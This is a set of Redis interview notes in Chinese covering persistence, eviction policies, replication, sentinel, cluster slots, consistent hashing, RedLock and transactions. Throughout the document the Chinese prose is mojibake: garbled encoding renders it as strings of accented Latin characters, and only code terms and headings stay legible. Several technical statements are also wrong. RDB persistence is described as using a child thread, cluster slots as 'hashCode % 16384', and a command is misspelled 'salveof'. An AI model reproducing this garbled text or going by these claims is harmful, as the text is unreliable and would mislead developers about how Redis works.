ç”±äºæ˜¯å†…å­˜æ•°æ®åº“ï¼Œæ‰€ä»¥ï¼Œå•å°æœºå™¨ï¼Œå­˜å‚¨çš„æ•°æ®é‡ï¼Œè·Ÿæœºå™¨æœ¬èº«çš„å†…å­˜å¤§å°ã€‚è™½ç„¶Redisæœ¬èº«æœ‰keyè¿‡æœŸç­–ç•¥ï¼Œä½†æ˜¯è¿˜æ˜¯éœ€è¦æå‰é¢„ä¼°å’ŒèŠ‚çº¦å†…å­˜ã€‚å¦‚æœå†…å­˜å¢é•¿è¿‡å¿«ï¼Œéœ€è¦å®šæœŸåˆ é™¤æ•°æ®ã€‚

å¦‚æœè¿›è¡Œå®Œæ•´é‡åŒæ­¥ï¼Œç”±äºéœ€è¦ç”Ÿæˆrdbæ–‡ä»¶ï¼Œå¹¶è¿›è¡Œä¼ è¾“ï¼Œä¼šå ç”¨ä¸»æœºçš„CPUï¼Œå¹¶ä¼šæ¶ˆè€—ç°ç½‘çš„å¸¦å®½ã€‚ä¸è¿‡redis2.8ç‰ˆæœ¬ï¼Œå·²ç»æœ‰éƒ¨åˆ†é‡åŒæ­¥çš„åŠŸèƒ½ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¯èƒ½æœ‰å®Œæ•´é‡åŒæ­¥çš„ã€‚æ¯”å¦‚ï¼Œæ–°ä¸Šçº¿çš„å¤‡æœºã€‚

ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œè¿›è¡Œé‡å¯ï¼Œå°†ç¡¬ç›˜ä¸­çš„æ•°æ®åŠ è½½è¿›å†…å­˜ï¼Œæ—¶é—´æ¯”è¾ƒä¹…ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œredisä¸èƒ½æä¾›æœåŠ¡ã€‚

ç‰¹æ€§ï¼š

æŒä¹…åŒ–ï¼Œé›†ç¾¤ï¼Œäº‹åŠ¡

æœ¬æ¬¡RedisåŸºäºLinuxä¸Šå­¦ä¹ ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ­å»º

## ä¸ºä»€ä¹ˆè¦ç”¨ç¼“å­˜ï¼Ÿ

å› ä¸º`redis`çš„é«˜æ€§èƒ½ä¸é«˜å¹¶å‘ã€‚

## ä¸ºä»€ä¹ˆrediså•çº¿ç¨‹è¿˜æ”¯æŒé«˜å¹¶å‘ï¼Ÿ

å› ä¸º`Redis`æ˜¯åŸºäºå†…å­˜çš„æ“ä½œï¼ŒCPUä¸æ˜¯`Redis`çš„ç“¶é¢ˆï¼Œ`Redis`çš„ç“¶é¢ˆæœ€æœ‰å¯èƒ½æ˜¯æœºå™¨å†…å­˜çš„å¤§å°æˆ–è€…ç½‘ç»œå¸¦å®½ã€‚æ—¢ç„¶å•çº¿ç¨‹å®¹æ˜“å®ç°è€Œä¸”çœå»äº†å¾ˆå¤šä¸Šä¸‹æ–‡åˆ‡æ¢çº¿ç¨‹çš„æ—¶é—´ï¼Œè€Œä¸”CPUä¸ä¼šæˆä¸ºç“¶é¢ˆï¼Œé‚£å°±é¡ºç†æˆç« åœ°é‡‡ç”¨å•çº¿ç¨‹çš„æ–¹æ¡ˆäº†ã€‚

`redis`ä½¿ç”¨**`epoll`å¤šè·¯I/Oå¤ç”¨æŠ€æœ¯**ï¼Œå•ä¸ªçº¿ç¨‹å¯ä»¥å¤„ç†å¤§é‡çš„å¹¶å‘è¿æ¥ã€‚`epoll`æ˜¯ä¸€ç§é«˜æ•ˆçš„å¤šè·¯å¤ç”¨æŠ€æœ¯ã€‚

## ä¸ºä»€ä¹ˆè¦ç”¨redisè€Œä¸æ˜¯mapæˆ–è€…guavaåšç¼“å­˜ï¼Ÿ

ç¼“å­˜åˆ†ä¸ºæœ¬åœ°ç¼“å­˜å’Œåˆ†å¸ƒå¼ç¼“å­˜ã€‚ä»¥ Java ä¸ºä¾‹ï¼Œä½¿ç”¨è‡ªå¸¦çš„ map æˆ–è€… guava å®ç°çš„æ˜¯æœ¬åœ°ç¼“å­˜ï¼Œæœ€ä¸»è¦çš„ç‰¹ç‚¹æ˜¯è½»é‡ä»¥åŠå¿«é€Ÿï¼Œç”Ÿå‘½å‘¨æœŸéšç€ `jvm` çš„é”€æ¯è€Œç»“æŸï¼Œå¹¶ä¸”åœ¨å¤šå®ä¾‹çš„æƒ…å†µä¸‹ï¼Œæ¯ä¸ªå®ä¾‹éƒ½éœ€è¦å„è‡ªä¿å­˜ä¸€ä»½ç¼“å­˜ï¼Œ**ç¼“å­˜ä¸å…·æœ‰ä¸€è‡´æ€§**ã€‚

ä½¿ç”¨ `redis` æˆ– `memcached` ä¹‹ç±»çš„ç§°ä¸ºåˆ†å¸ƒå¼ç¼“å­˜ï¼Œåœ¨å¤šå®ä¾‹çš„æƒ…å†µä¸‹ï¼Œå„å®ä¾‹å…±ç”¨ä¸€ä»½ç¼“å­˜æ•°æ®ï¼Œç¼“å­˜å…·æœ‰ä¸€è‡´æ€§ã€‚ç¼ºç‚¹æ˜¯éœ€è¦ä¿æŒ `redis` æˆ– `memcached`æœåŠ¡çš„é«˜å¯ç”¨ï¼Œæ•´ä¸ªç¨‹åºæ¶æ„ä¸Šè¾ƒä¸ºå¤æ‚ã€‚

## Redisæ•°æ®ç»“æ„ï¼Ÿstringä¸hashçš„åŒºåˆ«ï¼Ÿ

stringã€listã€hashã€setã€zsetã€‚

Stringå¤šåº”ç”¨äºç®€å•çš„é”®å€¼å¯¹ç¼“å­˜ï¼›hashå‚¨å­˜ç»“æ„åŒ–æ•°æ®ï¼Œæ¯”å¦‚ä¸€ä¸ªå¯¹è±¡ã€‚

## redisåº”ç”¨åœºæ™¯ï¼Ÿ

è®¡æ•°å™¨ã€åˆ†å¸ƒå¼ä¼šè¯ç¼“å­˜ã€åˆ†å¸ƒå¼é”å®ç°ç­‰ç­‰ã€‚

## è·³è·ƒè¡¨ï¼ˆskipListï¼‰ï¼Ÿ

`SkipList`æ˜¯åœ¨**æœ‰åºé“¾è¡¨**çš„åŸºç¡€ä¸Šè¿›è¡Œäº†æ‰©å±•ï¼Œè§£å†³äº†æœ‰åºé“¾è¡¨ç»“æ„æŸ¥æ‰¾ç‰¹å®šå€¼å›°éš¾çš„é—®é¢˜ï¼ŒæŸ¥æ‰¾ç‰¹å®šå€¼çš„æ—¶é—´å¤æ‚åº¦ä¸º`O(logn)`ï¼Œä»–æ˜¯ä¸€ç§å¯ä»¥ä»£æ›¿å¹³è¡¡æ ‘çš„æ•°æ®ç»“æ„ã€‚

å®ƒçš„æ•ˆç‡å’Œçº¢é»‘æ ‘ä»¥åŠ AVL æ ‘ä¸ç›¸ä¸Šä¸‹ï¼Œä½†è·³è¡¨çš„åŸç†ç›¸å½“ç®€å•ï¼Œåªè¦ä½ èƒ½ç†Ÿç»ƒæ“ä½œé“¾è¡¨ï¼Œå°±èƒ½è½»æ¾å®ç°ä¸€ä¸ª `SkipList`ã€‚

## redisæŒä¹…åŒ–æœºåˆ¶ï¼Ÿ

1. **RDB**ï¼šå¼€å¯ä¸€ä¸ªæ–°çš„çº¿ç¨‹æ¥å®Œæˆå¾€`rdb`æ–‡ä»¶ä¸­çš„å†™æ“ä½œã€‚ä¸»çº¿ç¨‹ç»§ç»­å¤„ç†å‘½ä»¤ã€‚**ä½¿ç”¨å•ç‹¬çš„å­çº¿ç¨‹æ¥è¿›è¡ŒæŒä¹…åŒ–**ã€‚ä¸»çº¿ç¨‹ä¸è¿›è¡Œä»»ä½•çš„IOæ“ä½œã€‚ä¿è¯`redis`çš„é«˜æ€§èƒ½ã€‚ç¼ºç‚¹æ˜¯å¯èƒ½ä¼šä¸¢å¤±ä¸€äº›æ•°æ®ã€‚
2. **AOF** ï¼šAOFæŒä¹…åŒ–(å³Append Only FileæŒä¹…åŒ–)ï¼Œåˆ™æ˜¯å°†`Redis`æ‰§è¡Œçš„æ¯æ¬¡å†™å‘½ä»¤è®°å½•åˆ°å•ç‹¬çš„æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œå½“é‡å¯`Redis`ä¼šé‡æ–°å°†æŒä¹…åŒ–çš„æ—¥å¿—ä¸­æ–‡ä»¶æ¢å¤æ•°æ®ã€‚AOFæœ‰ä¸€ä¸ª**é‡å†™æ¨¡å¼**ï¼Œå½“æ—¥å¿—æ–‡ä»¶è¿‡å¤§æ—¶å¯ä»¥å¯¹å…¶è¿›è¡Œå‹ç¼©ã€‚AOFå¾€å¾€æ•ˆç‡ä½äºRDBä¸€äº›ã€‚

**AOFçš„è¿½å†™ç­–ç•¥**ï¼šå»ºè®®ä½¿ç”¨æ¯ç§’åŒæ­¥ä¸€æ¬¡`ï¼ˆeverysecï¼‰`ç­–ç•¥ã€‚

**rewriteæœºåˆ¶**ï¼šrewriteä¼šè®°å½•ä¸Šæ¬¡é‡å†™æ—¶AOFæ–‡ä»¶çš„å¤§å°ï¼Œå½“AOFæ–‡ä»¶æ˜¯ä¸Šä¸€æ¬¡å¤§å°çš„äºŒå€ä¸”å¤§äº64Mæ—¶è§¦å‘ã€‚

## å¦‚ä½•é€‰æ‹©åˆé€‚çš„æŒä¹…åŒ–æ–¹å¼ï¼Ÿ

ä¸€èˆ¬æ¥è¯´ä¸¤è€…é…åˆä½¿ç”¨æ•ˆæœæœ€ä½³ï¼Œå½“ `Redis` é‡å¯çš„æ—¶å€™ä¼šä¼˜å…ˆè½½å…¥AOFæ–‡ä»¶æ¥æ¢å¤åŸå§‹çš„æ•°æ®ï¼Œå› ä¸ºåœ¨é€šå¸¸æƒ…å†µä¸‹AOFæ–‡ä»¶ä¿å­˜çš„æ•°æ®é›†è¦æ¯”RDBæ–‡ä»¶ä¿å­˜çš„æ•°æ®é›†è¦å®Œæ•´ã€‚

å¦‚æœå¯ä»¥å®¹å¿æ•°åˆ†é’Ÿå†…çš„æ•°æ®ä¸¢å¤±ï¼Œå¯ä»¥åªé€‰ç”¨RDBæ–¹å¼ï¼Œè¿˜æ¯”è¾ƒå¿«ã€‚

ä¸æ¨èåªä½¿ç”¨AOFæ–¹å¼ã€‚

## 9ã€è¿‡æœŸé”®çš„åˆ é™¤ç­–ç•¥ï¼Ÿï¼ˆç¾å›¢ï¼‰

- **å®šæ—¶è¿‡æœŸ**ï¼šæ¯ä¸ªè®¾ç½®è¿‡æœŸæ—¶é—´çš„keyéƒ½éœ€è¦åˆ›å»ºä¸€ä¸ª**å®šæ—¶å™¨**ï¼Œåˆ°è¿‡æœŸæ—¶é—´å°±ä¼šç«‹å³æ¸…é™¤ã€‚è¯¥ç­–ç•¥å¯ä»¥ç«‹å³æ¸…é™¤è¿‡æœŸçš„æ•°æ®ï¼Œå¯¹å†…å­˜å¾ˆå‹å¥½ï¼›ä½†æ˜¯ä¼šå ç”¨å¤§é‡çš„CPUèµ„æºå»å¤„ç†è¿‡æœŸçš„æ•°æ®ï¼Œä»è€Œå½±å“ç¼“å­˜çš„å“åº”æ—¶é—´å’Œååé‡ã€‚
- **æƒ°æ€§è¿‡æœŸ**ï¼šåªæœ‰å½“è®¿é—®ä¸€ä¸ªkeyæ—¶ï¼Œæ‰ä¼šåˆ¤æ–­è¯¥keyæ˜¯å¦å·²è¿‡æœŸï¼Œè¿‡æœŸåˆ™æ¸…é™¤ã€‚è¯¥ç­–ç•¥å¯ä»¥æœ€å¤§åŒ–åœ°èŠ‚çœCPUèµ„æºï¼Œå´å¯¹å†…å­˜éå¸¸ä¸å‹å¥½ã€‚æç«¯æƒ…å†µå¯èƒ½å‡ºç°å¤§é‡çš„è¿‡æœŸkeyæ²¡æœ‰å†æ¬¡è¢«è®¿é—®ï¼Œä»è€Œä¸ä¼šè¢«æ¸…é™¤ï¼Œå ç”¨å¤§é‡å†…å­˜ã€‚

## redisè®¾ç½®é”®çš„è¿‡æœŸæ—¶é—´ä»¥åŠæ°¸ä¸è¿‡æœŸå‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿ

expireè®¾ç½®è¿‡æœŸæ—¶é—´

persistè®¾ç½®é”®æ°¸ä¸è¿‡æœŸï¼Œå¤šç”¨äºçƒ­ç‚¹æ•°æ®ã€‚

## redisçš„å†…å­˜æ·˜æ±°ç­–ç•¥æœ‰å“ªäº›ï¼Ÿ

- `noeviction`ï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œæ–°å†™å…¥æ“ä½œä¼šæŠ¥é”™ã€‚
- `allkeys-lru`ï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨é”®ç©ºé—´ä¸­ï¼Œç§»é™¤æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„keyã€‚ï¼ˆè¿™ä¸ªæ˜¯**æœ€å¸¸ç”¨**çš„ï¼‰
- `allkeys-random`ï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨é”®ç©ºé—´ä¸­ï¼Œéšæœºç§»é™¤æŸä¸ªkeyã€‚
- `volatile-lru`ï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®ç©ºé—´ä¸­ï¼Œç§»é™¤æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„keyã€‚
- `volatile-random`ï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®ç©ºé—´ä¸­ï¼Œéšæœºç§»é™¤æŸä¸ªkeyã€‚
- `volatile-ttl`ï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®ç©ºé—´ä¸­ï¼Œæœ‰æ›´æ—©è¿‡æœŸæ—¶é—´çš„keyä¼˜å…ˆç§»é™¤

## redisçº¿ç¨‹æ¨¡å‹ï¼Ÿï¼ˆshopeeï¼‰

`redis`ä»¥**å•çº¿ç¨‹**æ¨¡å¼è¿è¡Œï¼Œä½†æ˜¯é€šè¿‡ä½¿ç”¨ I/O å¤šè·¯å¤ç”¨æ¥ç›‘å¬å¤šä¸ªå¥—æ¥å­—ï¼ˆsocketï¼‰ï¼Œ æ–‡ä»¶äº‹ä»¶å¤„ç†å™¨æ—¢å®ç°äº†é«˜æ€§èƒ½çš„ç½‘ç»œé€šä¿¡æ¨¡å‹ï¼Œ åˆå¯ä»¥å¾ˆå¥½åœ°ä¸ `redis` æœåŠ¡å™¨ä¸­å…¶ä»–åŒæ ·ä»¥å•çº¿ç¨‹æ–¹å¼è¿è¡Œçš„æ¨¡å—è¿›è¡Œå¯¹æ¥ï¼Œ è¿™ä¿æŒäº† `Redis` å†…éƒ¨å•çº¿ç¨‹è®¾è®¡çš„ç®€å•æ€§ã€‚

## redisä¸»ä»å¤åˆ¶ï¼Ÿï¼ˆshopeeï¼‰

**ä¸»ä»è¿æ¥è¿‡ç¨‹ï¼š**

1. ä»æœåŠ¡å™¨è¿æ¥ä¸»æœåŠ¡å™¨ï¼Œå‘é€SYNCå‘½ä»¤ã€‚ä¸»æœåŠ¡å™¨æ¥æ”¶åˆ°SYNCå‘½ååï¼Œå¼€å§‹æ‰§è¡Œ**BGSAVE**å‘½ä»¤ç”Ÿæˆ**RDBæ–‡ä»¶**å¹¶ä½¿ç”¨ç¼“å†²åŒºè®°å½•æ­¤åæ‰§è¡Œçš„æ‰€æœ‰å†™å‘½ä»¤ã€‚
2. ä¸»æœåŠ¡å™¨åˆ›å»º**å¿«ç…§æ–‡ä»¶**ï¼Œå‘é€ç»™ä»æœåŠ¡å™¨ï¼Œå¹¶åœ¨å‘é€æœŸé—´ä½¿ç”¨ç¼“å†²åŒºè®°å½•æ‰§è¡Œçš„å†™å‘½ä»¤ã€‚å¿«ç…§æ–‡ä»¶å‘é€å®Œæ¯•ä¹‹åï¼Œå¼€å§‹å‘ä»æœåŠ¡å™¨å‘é€å­˜å‚¨åœ¨ç¼“å†²åŒºä¸­çš„å†™å‘½ä»¤ï¼›
3. ä»æœåŠ¡å™¨ä¸¢å¼ƒæ‰€æœ‰æ—§æ•°æ®ï¼Œè½½å…¥ä¸»æœåŠ¡å™¨å‘æ¥çš„å¿«ç…§æ–‡ä»¶ï¼Œä¹‹åä»æœåŠ¡å™¨å¼€å§‹æ¥å—ä¸»æœåŠ¡å™¨å‘æ¥çš„å†™å‘½ä»¤ï¼›
4. ä¸»æœåŠ¡å™¨æ¯æ‰§è¡Œä¸€æ¬¡å†™å‘½ä»¤ï¼Œå°±å‘ä»æœåŠ¡å™¨å‘é€ç›¸åŒçš„å†™å‘½ä»¤ã€‚
5. ä¸€æ—¦ä¸»æœºæŒ‚äº†ï¼Œä»æœºä¼šåŸåœ°å¾…å‘½ï¼Œä½†æ˜¯ä½¿ç”¨ **`salveof no one`** å‘½ä»¤ä¼š**ä½¿ä»æœºåä»†ä¸ºä¸»**ã€‚

**ä½œç”¨ï¼š**æ•°æ®å†—ä½™ã€æ•…éšœæ¢å¤ã€è´Ÿè½½å‡è¡¡ã€é«˜å¯ç”¨çš„åŸºçŸ³ã€‚ä½¿ç”¨slave of å‘½ä»¤å°†æŸä¸€å°rediså˜ä¸ºä»æœºã€‚

## rediså“¨å…µæœºåˆ¶ï¼Ÿï¼ˆshopeeï¼‰ï¼ˆæ»´æ»´ï¼‰ï¼ˆæ–°æµªï¼‰

1. Sentinel(å“¨å…µ) **è¿›ç¨‹**æ˜¯ç”¨äºç›‘æ§ `Redis` é›†ç¾¤ä¸­ Master ä¸»æœåŠ¡å™¨å·¥ä½œçš„çŠ¶æ€
2. åœ¨ Master ä¸»æœåŠ¡å™¨å‘ç”Ÿæ•…éšœçš„æ—¶å€™ï¼Œå¯ä»¥å®ç° Master å’Œ Slave æœåŠ¡å™¨çš„åˆ‡æ¢ï¼Œä¿è¯ç³»ç»Ÿçš„é«˜å¯ç”¨ï¼ˆHigh Availabilityï¼‰
3. ä¸ºäº†é˜²æ­¢`è„‘è£‚`å‘ç”Ÿï¼ŒèŠ‚ç‚¹ä¸ªæ•°ä¸€èˆ¬é…ç½®ä¸º 2n+1ã€‚

## redisé›†ç¾¤ï¼Ÿredis çš„ key æ˜¯å¦‚ä½•å¯»å€çš„ï¼Ÿåˆ†å¸ƒå¼å¯»å€éƒ½æœ‰å“ªäº›ç®—æ³•ï¼Ÿäº†è§£ä¸€è‡´æ€§ hash ç®—æ³•å—ï¼Ÿï¼ˆæ»´æ»´ï¼‰

**ä¸ºä»€ä¹ˆæœ‰äº†å“¨å…µæ¨¡å¼è¿˜éœ€è¦é›†ç¾¤ï¼Ÿ**

`redis`çš„å“¨å…µæ¨¡å¼åŸºæœ¬å·²ç»å¯ä»¥å®ç°é«˜å¯ç”¨ï¼Œè¯»å†™åˆ†ç¦» ï¼Œä½†æ˜¯åœ¨è¿™ç§æ¨¡å¼ä¸‹æ¯å°`redis`æœåŠ¡å™¨éƒ½å­˜å‚¨ç›¸åŒçš„æ•°æ®ï¼Œå¾ˆ**æµªè´¹å†…å­˜**ï¼Œæ‰€ä»¥åœ¨redis3.0ä¸ŠåŠ å…¥äº†clusteræ¨¡å¼ï¼Œå®ç°çš„`redis`çš„**åˆ†å¸ƒå¼å­˜å‚¨**ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯å°`redis`èŠ‚ç‚¹ä¸Šå­˜å‚¨ä¸åŒçš„å†…å®¹ã€‚

**æ•°æ®åˆ†é…ç­–ç•¥ï¼Ÿ**

é‡‡ç”¨ä¸€ç§å«åš`å“ˆå¸Œæ§½` (hash slot)çš„æ–¹å¼æ¥åˆ†é…æ•°æ®ï¼Œ`redis cluster` é»˜è®¤åˆ†é…äº† 16384 ä¸ªslotã€‚å°†keyçš„ `hashCode % 16384`å¾—å‡ºæ•°æ®çš„æ§½ä½ã€‚

**åˆ†å¸ƒå¼å¯»å€ç®—æ³•**

1. hash ç®—æ³•ï¼ˆå¤§é‡ç¼“å­˜é‡å»ºï¼‰
2. ä¸€è‡´æ€§ hash ç®—æ³•ï¼ˆè‡ªåŠ¨ç¼“å­˜è¿ç§»ï¼‰+ è™šæ‹ŸèŠ‚ç‚¹ï¼ˆè‡ªåŠ¨è´Ÿè½½å‡è¡¡ï¼‰
3. `redis` clusterï¼ˆé›†ç¾¤ï¼‰ çš„ hash slot ï¼ˆæ§½ï¼‰ç®—æ³•

## ä¸€è‡´æ€§hashè¯´ä¸€ä¸‹?

é¦–å…ˆé¢å¯¹æµ·é‡æ•°æ®ï¼Œä¸€å°`redis`è‚¯å®šæ˜¯ä¸å¤Ÿç”¨çš„ï¼Œä¸€è‡´æ€§hashç®—æ³•ä¸»è¦æ˜¯ç”¨æ¥å°†æ•°æ®æŒ‰ç…§ä¸€å®šçš„ç®—æ³•è§„å¾‹å­˜å‚¨åˆ°æŒ‡å®šçš„`redis`æœåŠ¡å™¨ä¸­ã€‚

å¸¸è§„çš„hashç®—æ³•ä¼šå¯¼è‡´ä¸€ä¸ªé—®é¢˜ï¼šå½“`redis`çš„å®ä¾‹ä¸ªæ•°å˜äº†é‚£ä¹ˆæ‰€æœ‰çš„hashå€¼éƒ½éœ€è¦é‡æ–°è®¡ç®—ï¼Œè¿™æ˜¯éå¸¸è€—æ—¶çš„ã€‚ä¸€è‡´æ€§hashçš„å‡ºç°è§£å†³äº†è¿™ç§é—®é¢˜ã€‚

1. hash(IP) % 2^32 -1 æ±‚å‡º`redis`ä¸»æœºåœ¨åœ†ç¯ä¸­çš„ä½ç½®ï¼Œ
2. ä½¿ç”¨hash(key) % 2^32-1æ±‚å‡ºæ•°æ®åœ¨ç¯ä¸Šçš„ä½ç½®ï¼Œä»è¯¥ä½ç½®é¡ºæ—¶é’ˆæŸ¥æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªä¸»æœºå³è¯¥æ•°æ®å­˜å‚¨çš„ä½ç½®ã€‚
3. è¿™æ ·ä¸€æ¥åŠæœ‰ä¸€ä¸ªæ ‡å‡†åŒ–çš„è®¡ç®—è¿‡ç¨‹äº†ã€‚

## ä»€ä¹ˆæ˜¯RedLockï¼Ÿ

`Redis` å®˜æ–¹ç«™æå‡ºäº†ä¸€ç§æƒå¨çš„åŸºäº `Redis` å®ç°åˆ†å¸ƒå¼é”çš„æ–¹å¼åå« *`Redlock`*ï¼Œæ­¤ç§æ–¹å¼æ¯”åŸå…ˆçš„å•èŠ‚ç‚¹çš„æ–¹æ³•æ›´å®‰å…¨ã€‚å®ƒå¯ä»¥ä¿è¯ä»¥ä¸‹ç‰¹æ€§ï¼š

1. å®‰å…¨ç‰¹æ€§ï¼šäº’æ–¥è®¿é—®ï¼Œå³æ°¸è¿œåªæœ‰ä¸€ä¸ª client èƒ½æ‹¿åˆ°é”
2. é¿å…æ­»é”ï¼šæœ€ç»ˆ client éƒ½å¯èƒ½æ‹¿åˆ°é”ï¼Œä¸ä¼šå‡ºç°æ­»é”çš„æƒ…å†µï¼Œå³ä½¿åŸæœ¬é”ä½æŸèµ„æºçš„ client crash äº†æˆ–è€…å‡ºç°äº†ç½‘ç»œåˆ†åŒº
3. å®¹é”™æ€§ï¼šåªè¦å¤§éƒ¨åˆ† `Redis` èŠ‚ç‚¹å­˜æ´»å°±å¯ä»¥æ­£å¸¸æä¾›æœåŠ¡

## ç¼“å­˜é›ªå´©ã€å‡»ç©¿ã€ç©¿é€ï¼Ÿï¼ˆç¾å›¢ï¼‰ï¼ˆæ»´æ»´ï¼‰

## ç¼“å­˜é¢„çƒ­ï¼Ÿ

ç§’æ€å¼€å§‹å‰ï¼Œå•†å“æ•°æ®ä»¥åŠåº“å­˜éƒ½é¢„çƒ­åˆ°redisã€‚

## 19ã€Redisæ”¯æŒçš„å®¢æˆ·ç«¯ï¼Ÿ

`Redisson`ã€`jedis`ã€`lettuce`ç­‰ç­‰ï¼Œå®˜æ–¹æ¨èä½¿ç”¨`Redisson`ã€‚

## Jedisä¸Redissonå¯¹æ¯”æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ

`Jedis`æ˜¯`Redis`çš„Javaå®ç°çš„å®¢æˆ·ç«¯ï¼Œå…¶APIæä¾›äº†æ¯”è¾ƒå…¨é¢çš„`Redis`å‘½ä»¤çš„æ”¯æŒï¼›`Redisson`å®ç°äº†**åˆ†å¸ƒå¼å’Œå¯æ‰©å±•**çš„Javaæ•°æ®ç»“æ„ï¼Œå’Œ`Jedis`ç›¸æ¯”ï¼ŒåŠŸèƒ½è¾ƒä¸ºç®€å•ï¼Œä¸æ”¯æŒå­—ç¬¦ä¸²æ“ä½œï¼Œä¸æ”¯æŒæ’åºã€äº‹åŠ¡ã€ç®¡é“ã€åˆ†åŒºç­‰`Redis`ç‰¹æ€§ã€‚`Redisson`çš„å®—æ—¨æ˜¯ä¿ƒè¿›ä½¿ç”¨è€…å¯¹`Redis`çš„å…³æ³¨åˆ†ç¦»ï¼Œä»è€Œè®©ä½¿ç”¨è€…èƒ½å¤Ÿå°†ç²¾åŠ›æ›´é›†ä¸­åœ°æ”¾åœ¨å¤„ç†ä¸šåŠ¡é€»è¾‘ä¸Šã€‚

`Redisson`è§£å†³äº†é”çš„è‡ªåŠ¨ç»­æœŸé—®é¢˜ï¼Œåªè¦ä¸šåŠ¡è¿˜åœ¨æ‰§è¡Œï¼Œ`Redisson`å°±ä¼šä¸ºé”è‡ªåŠ¨ç»­æœŸã€‚

## redisäº‹åŠ¡ï¼Ÿ

`Redis` äº‹åŠ¡çš„æœ¬è´¨æ˜¯é€šè¿‡**MULTIã€EXECã€WATCHã€discard **ç­‰ä¸€ç»„å‘½ä»¤çš„é›†åˆã€‚äº‹åŠ¡æ”¯æŒä¸€æ¬¡æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œä¸€ä¸ªäº‹åŠ¡ä¸­æ‰€æœ‰å‘½ä»¤éƒ½ä¼šè¢«åºåˆ—åŒ–ã€‚åœ¨äº‹åŠ¡æ‰§è¡Œè¿‡ç¨‹ï¼Œä¼šæŒ‰ç…§é¡ºåºä¸²è¡ŒåŒ–æ‰§è¡Œé˜Ÿåˆ—ä¸­çš„å‘½ä»¤ï¼Œå…¶ä»–å®¢æˆ·ç«¯æäº¤çš„å‘½ä»¤è¯·æ±‚ä¸ä¼šæ’å…¥åˆ°äº‹åŠ¡æ‰§è¡Œå‘½ä»¤åºåˆ—ä¸­ã€‚

```
multi : æ ‡è®°ä¸€ä¸ªäº‹åŠ¡å—çš„å¼€å§‹ï¼ˆ queued ï¼‰
exec : æ‰§è¡Œæ‰€æœ‰äº‹åŠ¡å—çš„å‘½ä»¤ ï¼ˆ ä¸€æ—¦æ‰§è¡Œexecåï¼Œä¹‹å‰åŠ çš„ç›‘æ§é”éƒ½ä¼šè¢«å–æ¶ˆæ‰ ï¼‰ã€€
discard : å–æ¶ˆäº‹åŠ¡ï¼Œæ”¾å¼ƒäº‹åŠ¡å—ä¸­çš„æ‰€æœ‰å‘½ä»¤
unwatch : å–æ¶ˆwatchå¯¹æ‰€æœ‰keyçš„ç›‘æ§
```

1. å¦‚æœä¸€ä¸ªäº‹åŠ¡ä¸­çš„å‘½ä»¤å‡ºç°é”™è¯¯ï¼Œé‚£ä¹ˆæ‰€æœ‰å‘½ä»¤éƒ½ä¸ä¼šæ‰§è¡Œã€‚
2. `Redis`äº‹åŠ¡**ä¸ä¿è¯å¤šæ¡æŒ‡ä»¤çš„åŸå­æ€§**ã€‚
3. åŸºäºLuaè„šæœ¬å¯ä»¥ä¿è¯è„šæœ¬ä¸­çš„æŒ‡ä»¤ä¸€æ¬¡æ€§æŒ‰é¡ºåºæ‰§è¡Œã€‚

## redisä¸memcachedçš„åŒºåˆ«ï¼Ÿ

1. **æ”¯æŒå­˜å‚¨çš„æ•°æ®ç±»å‹**ï¼š`redis`æ”¯æŒäº”ç§ç±»å‹ã€‚`memcached`æ”¯æŒæ–‡æœ¬ç±»å‹ä¸äºŒè¿›åˆ¶ç±»å‹ã€‚
2. **ç½‘ç»œIOæ¨¡å‹**ï¼š`redis`æ˜¯å•çº¿ç¨‹çš„å¤šè·¯IOå¤ç”¨æ¨¡å‹ï¼Œ`memcached`æ˜¯å¤šçº¿ç¨‹çš„éé˜»å¡IOæ¨¡å¼ã€‚
3. **`redis`æ”¯æŒæ•°æ®æŒä¹…åŒ–**ï¼Œ`memcached`ä¸æ”¯æŒ
4. ä½¿ç”¨åœºæ™¯ï¼š`redis`é€‚ç”¨äºå¤æ‚çš„æ•°æ®ç»“æ„ç¯å¢ƒï¼Œæœ‰æŒä¹…åŒ–éœ€æ±‚ã€‚`memcached`é€‚ç”¨äºçº¯<k,v>ä¸”æ•°æ®é‡çŸ©å¤§çš„ç¯å¢ƒä¸‹ã€‚

## rediså¸¸è§çš„æ€§èƒ½é—®é¢˜ä¸å¯¹åº”çš„è§£å†³æ–¹æ¡ˆï¼Ÿ

1. **Masteræœ€å¥½ä¸è¦åšä»»ä½•æŒä¹…åŒ–å·¥ä½œ**ï¼ŒåŒ…æ‹¬å†…å­˜å¿«ç…§å’ŒAOFæ—¥å¿—æ–‡ä»¶ï¼Œç‰¹åˆ«æ˜¯ä¸è¦å¯ç”¨å†…å­˜å¿«ç…§åšæŒä¹…åŒ–ã€‚
